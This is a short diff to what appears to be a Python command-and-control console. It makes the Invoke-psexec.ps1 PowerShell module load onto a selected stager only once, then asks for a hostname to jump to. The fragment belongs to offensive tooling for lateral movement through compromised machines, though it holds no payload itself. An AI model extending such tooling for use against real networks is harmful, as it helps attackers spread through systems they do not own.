@@ -475,10 +475,15 @@ class mymainclass():
                     if user_input_stager not in self.__t_myserver.get_running_stager():
                         print("Please input a valid stager uuid")
                         continue
-
-                    t_psloader = ps_loader()
-                    t_result = t_psloader.load_ps("Invoke-psexec.ps1")
-                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                    
+                    if ("Invoke-psexec.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-psexec.ps1")
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-psexec.ps1")
+                    else:
+                        print("Invoke-psexec already loaded")
 
                     removecomplete()
                     user_input_target = input("Please enter hostname to jump to: ")
